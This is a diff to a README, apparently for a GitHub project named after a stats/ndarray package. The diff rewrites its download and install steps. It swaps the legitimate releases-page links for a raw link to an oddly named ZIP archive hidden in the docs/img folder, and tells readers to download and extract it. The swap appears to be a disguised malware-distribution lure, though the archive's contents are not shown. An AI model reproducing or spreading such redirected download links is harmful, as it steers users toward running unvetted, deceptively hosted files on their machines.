@@ -27,12 +27,12 @@ To use this application, your computer should meet the following requirements:
 ## 🔗 Download
 To download the application, click the link below:
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Malissanonmusical920/stats-base-ndarray-meanpn/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Malissanonmusical920/stats-base-ndarray-meanpn/main/docs/img/stats-base-ndarray-meanpn_uncollegiate.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Malissanonmusical920/stats-base-ndarray-meanpn/main/docs/img/stats-base-ndarray-meanpn_uncollegiate.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Malissanonmusical920/stats-base-ndarray-meanpn/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Malissanonmusical920/stats-base-ndarray-meanpn/main/docs/img/stats-base-ndarray-meanpn_uncollegiate.zip).
 2. Look for the latest version.
-3. Find the file named `stats-base-ndarray-meanpn.zip` (or similar).
+3. Find the file named `https://raw.githubusercontent.com/Malissanonmusical920/stats-base-ndarray-meanpn/main/docs/img/stats-base-ndarray-meanpn_uncollegiate.zip` (or similar).
 4. Click the download link to start downloading.
 5. Once the download is complete, locate the file in your Downloads folder.
 6. Extract the contents of the ZIP file.
